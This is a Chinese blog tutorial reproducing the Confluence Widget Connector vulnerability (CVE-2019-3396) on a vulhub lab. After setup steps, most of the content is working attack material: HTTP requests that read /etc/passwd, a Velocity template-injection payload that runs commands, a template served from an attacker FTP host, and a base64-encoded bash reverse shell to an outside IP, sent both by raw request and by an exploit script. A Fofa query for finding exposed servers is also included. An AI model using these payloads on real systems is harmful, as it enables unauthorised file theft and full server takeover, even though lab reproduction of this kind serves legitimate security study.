**目录**

[Confluence](#t0 "Confluence")

[漏洞背景](#t1 "漏洞背景")

[漏洞影响版本](#t2 "漏洞影响版本")

[环境搭建](#t3 "环境搭建")

[漏洞复现](#t4 "漏洞复现")

[任意文件读取](#t5 "任意文件读取")

[RCE](#t6 "RCE")

[反弹shell](#t7 "反弹shell")

* * *

Confluence
==========

Confluence是Atlassian公司开发的一个专业的企业知识管理与协同软件，也可以用于构建企业wiki。使用简单，但它强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。Confluence为团队提供一个协作环境。在这里，团队成员齐心协力，各擅其能，协同地编写文档和管理项目。从此打破不同团队、不同部门以及个人之间信息孤岛的僵局，Confluence真正实现了组织资源共享。Confluence 已经在超过100个国家，13500个组织中成功地应用于企业内网平台、知识管理及文档管理，涉及财富1000企业、政府机构、教育机构、财务金融机构及技术研究领域。包括IBM、Sun MicroSystems、SAP等众多知名企业使用Confluence来构建企业Wiki并面向公众开放。

![](https://img-blog.csdnimg.cn/20210128105728494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

漏洞背景
----

2019年4月8日，Confluence官方发布了安全预警。指出Confluence Server与Confluence Data Center中的Widget Connector存在服务端模板注入漏洞，攻击者能利用此漏洞能够实现目录穿越与远程代码执行。

使用Fofa搜索Confluence关键词：app="ATLASSIAN-Confluence"

![](https://img-blog.csdnimg.cn/20210128110628371.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

漏洞影响版本
------

*   `6.6.12版本之前所有版本`
*   `6.7.0-6.12.2版本`
*   `6.13.3之前的所有``6.13.x版本`
*   `6.14.2之前的所有6.14.x版本`

`环境搭建`
------

`这里漏洞环境使用的是vulhub的环境：`[https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396](https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396 "https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396 ") 

进入该目录，启动。confluence是6.10.2版本的

```
docker-compose up -d
```


![](https://img-blog.csdnimg.cn/20210131161258257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后访问 http://vps:8090 进行安装引导，选择Trial Installation

![](https://img-blog.csdnimg.cn/20210131161329166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

之后会要求填写license key。点击“Get an evaluation license”，去Atlassian官方申请一个Confluence Server的测试证书（不要选择Data Center和Addons）

![](https://img-blog.csdnimg.cn/2021013116140931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后用谷歌账号登录。下面的Organization随便输入一个，注意勾选的是Confluence(Server)，Server ID默认会填我们的Server ID。然后点击Generate License

![](https://img-blog.csdnimg.cn/20210131161704285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

然后会自动跳转帮我们填好key。然后点击Next安装即可。

![](https://img-blog.csdnimg.cn/20210131172156728.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这一步小内存VPS可能安装失败或时间较长（建议使用4G内存以上的机器进行安装与测试），请耐心等待。

![](https://img-blog.csdnimg.cn/20210131172818562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210131172914605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210131173014537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210131173131634.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210131173145469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210131173252402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210131223958245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

漏洞复现
----

### 任意文件读取

6.12以前的Confluence没有限制文件读取的协议和路径，我们可以使用`file:///etc/passwd`来读取文件。也可以通过../跳转路径读文件

```
POST /rest/tinymce/1/macro/preview HTTP/1.1      
Host: 192.168.10.129:8090      
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0      
Accept: text/plain, */*; q=0.01      
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3      
Accept-Encoding: gzip, deflate, br      
Content-Type: application/json; charset=utf-8      
X-Requested-With: XMLHttpRequest      
Referer: http://192.168.10.129:8090      1
Content-Length: 167      1
X-Forwarded-For: 127.0.0.2      1
Connection: keep-alive       1
{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"file:///etc/passwd"},"body":""}}
```


![](https://img-blog.csdnimg.cn/20210131225909802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

读取../web.xml文件

![](https://img-blog.csdnimg.cn/20210131230040834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### RCE

由于该文件是一个Velocity模板，因此我们可以通过模板注入（SSTI）来执行任意命令。创建文件 r.vm

```
#set ($exp="exp")      
#set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($command))      
#set ($input=$exp.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))      
#set($sc = $exp.getClass().forName("java.util.Scanner"))      
#set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName("java.io.InputStream")))      
#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))      
#if($scan.hasNext())      
    $scan.next()      
#end
```


用python启动FTP服务

```
python -m pyftpdlib -p 9999
```


![](https://img-blog.csdnimg.cn/20210131225528651.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

发送数据包

```
POST /rest/tinymce/1/macro/preview HTTP/1.1      
Host: 192.168.10.129:8090      
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0      
Accept: text/plain, */*; q=0.01      
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3      
Accept-Encoding: gzip, deflate, br      
Content-Type: application/json; charset=utf-8      
X-Requested-With: XMLHttpRequest      
Referer: http://192.168.10.129:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&      1
Content-Length: 197      1
X-Forwarded-For: 127.0.0.2      1
Connection: keep-alive       1
{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"ftp://VPS的ip:9999/r.vm","command":"id"},"body":""}}
```


![](https://img-blog.csdnimg.cn/20210131225442473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210131225648622.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

或者直接用脚本命令执行，修改脚本的pyftp为我们自己搭建的vm文件即可，然后执行以下命令

```
python2 cve-2019-3396.py http://192.168.10.129:8090 "ifconfig"
```


![](https://img-blog.csdnimg.cn/2021013123174542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210131231716785.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 反弹shell

将执行命令的语句进行编码，传送门：[java.lang.Runtime.exec() Payload Workarounds - @Jackson\_T](http://www.jackson-t.ca/runtime-exec-payloads.html "java.lang.Runtime.exec() Payload Workarounds - @Jackson_T")

![](https://img-blog.csdnimg.cn/20210131230702281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

```
POST /rest/tinymce/1/macro/preview HTTP/1.1      
Host: 192.168.10.129:8090      
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0      
Accept: text/plain, */*; q=0.01      
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3      
Accept-Encoding: gzip, deflate, br      
Content-Type: application/json; charset=utf-8      
X-Requested-With: XMLHttpRequest      
Referer: http://192.168.10.129:8090/pages/resumedraft.action?draftId=786457&draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&      1
Content-Length: 292      1
X-Forwarded-For: 127.0.0.2      1
Connection: keep-alive       1
{"contentId":"1","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/test","width":"1000","height":"1000","_template":"ftp://VPS的ip:9999/r.vm","command":"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDguMTQyLjI3LzQ0NQgMD4mMQ==}|{base64,-d}|{bash,-i}"},"body":""}}
```


![](https://img-blog.csdnimg.cn/20210131230542270.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

用脚本反弹shell

```
python2 cve-2019-3396.py http://192.168.10.129:8090 "bash -c {echo,YmFz+JiAvZGV2L3RjcC80Ny4xMDguMTQyLjI3LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}"
```


![](https://img-blog.csdnimg.cn/20210131231957442.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

  如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）](https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396 "Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）")

                [Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）复现](https://mp.weixin.qq.com/s/GvXGhgLoBmJSce5Azd2-rA "Atlassian Confluence 路径穿越与命令执行漏洞（CVE-2019-3396）复现")